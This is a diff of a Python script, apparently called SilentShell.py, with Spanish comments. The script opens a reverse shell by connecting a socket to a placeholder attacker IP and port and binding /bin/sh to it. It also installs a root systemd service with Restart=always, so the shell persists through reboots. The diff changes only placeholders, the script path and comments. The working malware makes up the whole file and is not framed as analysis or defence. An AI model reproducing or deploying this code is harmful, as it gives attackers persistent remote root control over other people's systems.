@@ -2,10 +2,9 @@ import os
 import socket
 import time
 import subprocess
-import platform
 
-RHOST = "YOUR IP"
-RPORT = YOUR PORT
+RHOST = "YOUR_IP"
+RPORT = PORT
 
 def ejecutar_revshell():
     try:
@@ -13,8 +12,8 @@ def ejecutar_revshell():
         s.connect((RHOST, RPORT))
         os.dup2(s.fileno(), 0)  
         os.dup2(s.fileno(), 1)  
-        os.dup2(s.fileno(), 2)  
-        subprocess.call(["/bin/sh"])
+        os.dup2(s.fileno(), 2) 
+        subprocess.call(["/bin/sh"])  
     except Exception as e:
         print(f"Error en la conexión: {e}")
     finally:
@@ -26,10 +25,9 @@ Description=Revershell Script
 After=network.target
 
 [Service]
-ExecStart=/usr/bin/python3 /ruta/a/tu/script.py
+ExecStart=/usr/bin/python3 /root/SilentShell.py
 Restart=always
 User=root
-WorkingDirectory=/ruta/a/tu/script
 
 [Install]
 WantedBy=multi-user.target
@@ -37,11 +35,11 @@ WantedBy=multi-user.target
     service_path = "/etc/systemd/system/revshell.service"
     
     try:
-        # Escribir el archivo de servicio
+        
         with open(service_path, 'w') as service_file:
             service_file.write(service_content)
         
-        # Recargar systemd y habilitar el servicio
+        
         subprocess.run(["sudo", "systemctl", "daemon-reload"])
         subprocess.run(["sudo", "systemctl", "enable", "revshell.service"])
         subprocess.run(["sudo", "systemctl", "start", "revshell.service"])
@@ -56,5 +54,5 @@ def main():
         time.sleep(30)  
 
 if __name__ == "__main__":
-    configurar_inicio()
-    main()
+    configurar_inicio()  
+    main()  
